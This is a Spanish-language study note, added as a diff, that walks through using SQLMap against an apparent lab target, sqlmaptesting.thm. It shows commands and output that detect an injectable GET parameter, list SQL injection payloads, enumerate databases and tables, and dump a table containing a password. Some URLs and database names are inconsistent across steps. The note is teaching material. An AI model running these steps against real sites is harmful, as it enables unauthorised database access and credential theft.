@@ -1,0 +1,200 @@
+---
+layout: apunte
+title: "3. Automated SQL Injection Tool"
+---
+
+Ejecutar un ataque SQLI, requiere encontrar la vulnerabilidad SQLI dentro de una aplicación web. Sin embargo, hacer eso de forma manual puede requerir tiempo y esfuerzo.
+
+SQLMap es una herramienta automatizada para detectar y explotar SQLI en aplicaciones web. Simplifica el proceso de identificar estas vulnerabilidades.
+
+Es una herramienta de CLI, por lo que si escribes `--help` podrás ver todas las flags que puedes usar. Si no quieres hacerlo manualmente en cada comando, puedes activar la flag `--wizard` que hará que te guíe por el proceso:
+
+```shell
+user@ubuntu:~$ sqlmap --wizard
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.2.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[text removed]
+
+[*] starting at 08:42:50
+
+[08:42:50] [INFO] starting wizard interface
+Please enter full target URL (-u): 
+```
+
+La flag `--dbs` te ayuda a extraer los nombres de las bases de datos. Una vez los tengas, puedes extraer información de las tablas de esa base de datos usando `-D database_name --tables`. Después de obtener las tablas, puedes usar `-D database_name -T table_name --dump`. Las diferentes flags nos ayudan a extraer información detallada de las bases de datos. Veamos un caso práctico:
+
+El primer paso es buscar una URL vulnerable. Muchas veces te encontrarás con URLs que usan peticiones GET (como `http://sqlmaptesting.thm/search?cat=1`) para obtener la información, si ves una de estas puedes testear la URL con la flag `-u`.
+
+Usaremos una URL web supuesta vulnerable: `http://sqlmaptesting.thm` para la demostración. Supón que esta página tiene una opción de búsqueda y cuando haces click en ella y buscas algo, la URL se convierte en `http://sqlmaptesting.thm/cat=1`, que usa el parámetro GET `cat=1`. Como sabemos, estas URLs pueden ser vulnerables, por lo que probamos:
+
+```shell
+user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
+      __H__
+ ___ ___[']_____ ___ ___  {1.2.4#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[text removed]
+[08:43:49] [INFO] testing connection to the target URL
+[08:43:49] [INFO] heuristics detected web page charset 'ascii'
+[08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[08:43:49] [INFO] testing if the target URL content is stable
+[08:43:50] [INFO] target URL content is stable
+[08:43:50] [INFO] testing if GET parameter 'cat' is dynamic
+[text removed]
+[08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
+[text removed]
+[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 2175=2175
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cat=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f4965794c6873,0x7170766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HMgq
+---
+[08:45:16] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx, PHP 5.6.40
+back-end DBMS: MySQL >= 5.1
+[text removed]
+```
+
+Los resultados muestran que diferentes tipos de SQLI se han identificado en la URL objetivo. Estas son técnicas de SQLI. Mientras que en una "boolean based" usas booleanos, como `1=1`, en una "error based" modificas la query para generar errores y estos errores contienen información valiosa sobre los datos.
+
+Usemos flags para explotar la URL:
+
+```shell
+user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
+       __H__
+ ___ ___[']_____ ___ ___  {1.2.4#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[text removed]
+[08:49:00] [INFO] resuming back-end DBMS' mysql' 
+[08:49:00] [INFO] testing connection to the target URL
+[08:49:01] [INFO] heuristics detected web page charset 'ascii'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 2175=2175
+[text removed]    
+[08:49:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx, PHP 5.6.40
+back-end DBMS: MySQL >= 5.1
+[08:49:01] [INFO] fetching database names
+available databases [2]:
+[*] users
+[*] members
+
+[text removed]
+```
+
+Después de ejecutar  el comando vemos que hay dos bases de datos: `users` y `members`. Seleccionamos `users`, para ello definimos la base de datos después de la flag `-D` y usaremos `--tables` para obtener el nombre de las tablas:
+
+```shell
+user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
+       __H__
+ ___ ___[']_____ ___ ___  {1.2.4#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[text removed]
+[08:50:46] [INFO] resuming back-end DBMS' mysql' 
+[08:50:46] [INFO] testing connection to the target URL
+[08:50:46] [INFO] heuristics detected web page charset 'ascii'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 2175=2175
+[text removed]
+[08:50:46] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx, PHP 5.6.40
+back-end DBMS: MySQL >= 5.1
+[08:50:46] [INFO] fetching tables for database: 'users'
+Database: acuart
+[3 tables]
++-----------+
+| johnath   |
+| alexas    |
+| thomas    |     
++-----------+
+
+[text removed]
+```
+
+Ahora que tenemos las tablas de la base de datos, extraeremos la información de `thomas`. Para ello, definiremos la base de datos con la flag `-D`, la tabla con `-T` y la flag `--dump` para extraer los datos.
+
+```shell
+user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
+       __H__
+ ___ ___[']_____ ___ ___  {1.2.4#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[text removed]
+[08:51:48] [INFO] resuming back-end DBMS' mysql' 
+[08:51:48] [INFO] testing connection to the target URL
+[08:51:49] [INFO] heuristics detected web page charset 'ascii'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 2175=2175
+[text removed]
+[08:51:49] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx, PHP 5.6.40
+back-end DBMS: MySQL >= 5.1
+[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'
+[08:51:49] [INFO] fetching entries for table 'thomas' in database' users'
+[08:51:49] [INFO] recognized possible password hashes in column 'passhash'
+do you want to store hashes to a temporary file for eventual further processing n
+do you want to crack them via a dictionary-based attack? [Y/n/q] n
+Database: users
+Table: thomas
+[1 entry]
++---------------------+------------+---------+
+| Date                | name       | pass    |    
++---------------------+------------+----------
+| 09/09/2024          | Thomas THM | testing |    
++---------------------+------------+---------+
+
+[text removed]
+```
+
+También se pueden usar URLs que usen el método POST, donde la información se manda en el cuerpo de la petición en lugar de la URL. Para hacer esto debes interceptar una petición y guardarla en un `.txt` para después usarla con SQLMap de la siguiente manera:
+
+```shell
+user@ubuntu:~$ sqlmap -r intercepted_request.txt`
+```
+
